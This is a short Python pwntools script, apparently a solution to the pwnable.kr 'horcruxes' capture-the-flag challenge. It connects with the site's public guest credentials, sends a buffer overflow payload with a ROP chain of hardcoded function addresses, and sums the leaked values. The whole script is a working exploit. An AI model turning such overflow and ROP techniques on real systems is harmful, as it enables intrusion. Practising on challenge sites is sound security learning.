from pwn import *
import re

a = p32(0x0804129d)
b = p32(0x080412cf)
c = p32(0x08041301)
d = p32(0x08041333)
e = p32(0x08041365)
f = p32(0x08041397)
g = p32(0x080413c9)
ropme_addr = p32(0x0804150b)


sh = ssh('horcruxes', 'pwnable.kr', password='guest', port=2222)
p = sh.remote('0', 10016)

payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabf"
payload += a+b+c+d+e+f+g+ropme_addr


print(p.recvuntil(b"Select Menu:"))

p.sendline(payload)

p.recvline()

print(f'sent: {payload}')
sum = 0
for i in range(0,7): 
    l = p.recvline().decode()
    n = re.findall(r"[+-]?\d+",l)[0]
    print(l)
    sum += int(n)
    
print(sum)

p.interactive()


